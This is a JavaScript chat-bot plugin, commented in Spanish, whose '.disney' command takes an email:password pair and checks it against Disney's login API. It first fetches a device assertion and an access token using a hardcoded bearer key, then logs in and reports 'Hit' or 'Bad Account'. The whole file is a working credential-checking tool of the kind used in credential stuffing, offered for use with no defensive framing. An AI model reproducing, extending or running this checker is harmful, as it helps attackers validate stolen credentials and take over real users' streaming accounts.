import axios from 'axios';

let handler = async (m, { conn, command, text, args, usedPrefix }) => {
  if (command === 'disney') {
    // Verificamos que el texto tiene el formato correcto: mail:pass
    const [email, password] = text.split(':');

    if (!email || !password) {
      return conn.reply(m.chat, 'Formato inválido. Usa el formato: `.Disney email:password`', m);
    }

    try {
      // Crear una sesión de axios para realizar las peticiones
      const session = axios.create();
      const headers = {
        'content-type': 'application/json',
        'authorization': 'Bearer ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
      };

      // Hacer la primera petición para obtener el assertion
      const deviceData = JSON.stringify({ deviceFamily: "browser", applicationRuntime: "chrome", deviceProfile: "windows", attributes: {} });
      const deviceResponse = await session.post('https://global.edge.bamgrid.com/devices', { headers, data: deviceData });

      if (!deviceResponse.data || !deviceResponse.data.assertion) {
        return conn.reply(m.chat, `Error al obtener assertion para ${email}. Intenta nuevamente más tarde.`, m);
      }

      const assertion = deviceResponse.data.assertion;

      // Hacer la segunda petición para obtener el access token
      const tokenData = `grant_type=urn%3Aietf%3Aparams%3Aoauth%3Agrant-type%3Atoken-exchange&latitude=0&longitude=0&platform=browser&subject_token=${assertion}&subject_token_type=urn%3Abamtech%3Aparams%3Aoauth%3Atoken-type%3Adevice`;
      const tokenResponse = await session.post('https://global.edge.bamgrid.com/token', { headers: { ...headers, 'content-type': 'application/x-www-form-urlencoded' }, data: tokenData });

      if (!tokenResponse.data || !tokenResponse.data.access_token) {
        return conn.reply(m.chat, `Error al obtener access token para ${email}. Intenta nuevamente más tarde.`, m);
      }

      const accessToken = tokenResponse.data.access_token;

      // Realizar el login con las credenciales del usuario
      const loginHeaders = { ...headers, 'authorization': `Bearer ${accessToken}` };
      const loginData = JSON.stringify({ email, password });
      const loginResponse = await session.post('https://global.edge.bamgrid.com/idp/login', { headers: loginHeaders, data: loginData });

      // Verificar si la respuesta contiene el id_token o algún otro indicador de éxito
      if (loginResponse.data && loginResponse.data.id_token) {
        // Si el login es exitoso
        conn.reply(m.chat, `Hit para ${email}`, m); // Respuesta directa de "Hit"
      } else {
        // Si el login falla
        conn.reply(m.chat, `Bad Account para ${email}`, m); // Respuesta directa de "Bad"
      }
    } catch (error) {
      console.error('Error en el proceso de verificación:', error);
      // Si ocurre un error, responder con un mensaje genérico
      conn.reply(m.chat, `Error al verificar las credenciales para ${email}. Intenta nuevamente más tarde.`, m);
    }
  }
};

// Establecer el comando
handler.command = ['disney'];

export default handler;
